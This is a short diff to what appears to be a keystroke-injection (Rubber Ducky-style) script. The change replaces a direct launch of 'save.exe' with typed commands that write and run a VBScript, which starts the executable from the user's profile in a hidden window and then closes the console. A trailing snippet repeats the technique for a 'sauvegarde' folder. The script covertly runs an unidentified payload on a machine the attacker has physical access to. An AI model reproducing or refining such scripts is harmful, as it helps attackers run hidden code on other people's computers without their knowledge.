@@ -64,7 +64,19 @@ DELAY 300
 STRING cd %userprofile%
 ENTER  
 DELAY 200
-STRING START save.exe /B
+STRING echo Set Shell = CreateObject("WScript.Shell")  > save.vbs
+ENTER 
+STRING echo Shell.CurrentDirectory = Shell.ExpandEnvironmentStrings("%USERPROFILE%") >> save.vbs
+ENTER
+STRING echo Shell.Run "save.exe", 0, False  >> save.vbs
+ENTER
+STRING cscript save.vbs 
+ENTER
+DELAY 500 
+ALT e
+DELAY 300
+STRING exit 
+ENTER
 ENTER
 DELAY 600
 ENTER 
@@ -100,4 +112,8 @@ ENTER
 
 
 
+
+echo Set Shell = CreateObject("WScript.Shell")  > save.vbs
+echo Shell.CurrentDirectory = Shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\sauvegarde"  >> save.vbs
+echo Shell.Run "save.exe", 0, False  >> save.vbs
 
